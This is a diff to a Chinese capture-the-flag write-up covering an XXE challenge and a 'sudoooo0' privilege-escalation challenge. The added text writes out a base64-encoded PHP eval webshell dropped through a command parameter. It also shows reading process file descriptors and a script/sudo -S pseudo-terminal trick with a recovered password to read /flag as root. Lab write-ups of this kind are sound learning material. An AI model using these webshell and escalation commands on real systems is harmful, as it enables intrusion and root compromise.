@@ -382,7 +382,9 @@ Go
 <img width="1375" height="480" alt="image" src="https://github.com/user-attachments/assets/26943a3e-20e8-4a40-9c3e-9c2d620fbb5e" />
 后面再改个位置就行，不再截了。
 
-Mini Blog
+
+**Mini Blog**
+
 这里原来看到个个人资料有个图片上传，试了一下感觉是白名单想搞个二次渲染发现不行，再试了一下XSS也不行，然后抓个包：
 <img width="873" height="312" alt="image" src="https://github.com/user-attachments/assets/9eee3ac9-4495-43ce-aee5-331cd5d68b63" />
 看起来是XXE，构造一下就行(XXE是啥，常用方法让我后面好好学一下....)
@@ -397,6 +399,76 @@ Mini Blog
 </post>
 ```
 <img width="1883" height="289" alt="image" src="https://github.com/user-attachments/assets/0676c97d-7f82-4232-abfb-28dbc58c953f" />
+
+**sudoooo0**
+
+说已经放了shell，这里用TsScan扫一下发现是webshell.php，但是这里不知道密码，可以进行fuzz，结果是cmd，后面发现直接cat无法获取，那么这里就跟题目说的一样就要进行提权了
+<img width="1735" height="730" alt="image" src="https://github.com/user-attachments/assets/9fe99e43-0d7f-4bee-889e-17b89289866a" />
+
+小辣鸡当然是做不出来滴，况且这里只有29解，还是看大佬的膜拜学习，这里都用到的是再写个webshell连接：
+```
+?cmd=system("echo PD9waHAKZXZhbCgkX1BPU1RbInBhc3MiXSk7Cg== | base64 -d > pass.php");
+```
+<img width="1523" height="987" alt="image" src="https://github.com/user-attachments/assets/1da10980-06e6-4112-84be-492758f38191" />
+
+然后是ps aux 查看当前系统的所有进程：
+<img width="1963" height="581" alt="image" src="https://github.com/user-attachments/assets/8aae8a97-f3cc-4389-9994-3e9a3b931a70" />
+
+发现PID为25的进程在维护一个持久的 sudo 会话，并且密码是**SRoQ5cQ**,
+
+但蚁剑连接的shell其实是一个通过php木马文件模拟的虚拟终端，并不是tty这种可交互的终端，那么再查看该进程的详细信息：
+```
+ls -la /proc/25/fd/
+```
+<img width="984" height="269" alt="image" src="https://github.com/user-attachments/assets/fb78b19a-0ac1-4b53-8a2d-3001c511b442" />
+
+这里就能看到有dev/pts，这在Linux中就代表着伪终端设备，可通过该tty获取flag，构造命令如下：
+```bash
+script -f /dev/pts/0 -c 'echo SRoQ5cQ | sudo -S cat /flag'
+```
+整体作用：
+
+| 步骤 | 含义                       |
+| -- | ------------------------ |
+| 1  | 使用 `script` 创建或利用一个伪终端   |
+| 2  | 在 `/dev/pts/0` 这个终端里执行命令 |
+| 3  | 自动输入 sudo 密码             |
+| 4  | 用 root 权限读取 `/flag`      |
+
+
+命令结构拆解：
+
+| 部分   | 命令             | 作用                  |          |
+| ---- | -------------- | ------------------- | -------- |
+| 程序   | `script`       | 创建或管理终端会话           |          |
+| 参数1  | `-f`           | 实时刷新输出              |          |
+| 参数2  | `/dev/pts/0`   | 指定终端设备              |          |
+| 参数3  | `-c`           | 执行指定命令              |          |
+| 执行内容 | `'echo SRoQ5cQ | sudo -S cat /flag'` | 在终端执行的命令 |
+
+
+| 部分             | 含义         |          |
+| -------------- | ---------- | -------- |
+| `echo SRoQ5cQ` | 输出 sudo 密码 |          |
+| `              | `          | 管道，把输出传递 |
+| `sudo -S`      | 从标准输入读取密码  |          |
+
+
+整个流程如下：
+
+| 步骤 | 操作                  |
+| -- | ------------------- |
+| 1  | 使用 `script` 创建伪终端   |
+| 2  | 连接到 `/dev/pts/0`    |
+| 3  | 在终端执行命令             |
+| 4  | 自动输入 sudo 密码        |
+| 5  | root 执行 `cat /flag` |
+| 6  | 输出 flag             |
+
+最终得到我们的flag：
+
+<img width="1070" height="213" alt="image" src="https://github.com/user-attachments/assets/5c0bddf6-a047-4a74-aeb7-e3460b139c2d" />
+
 
 
 
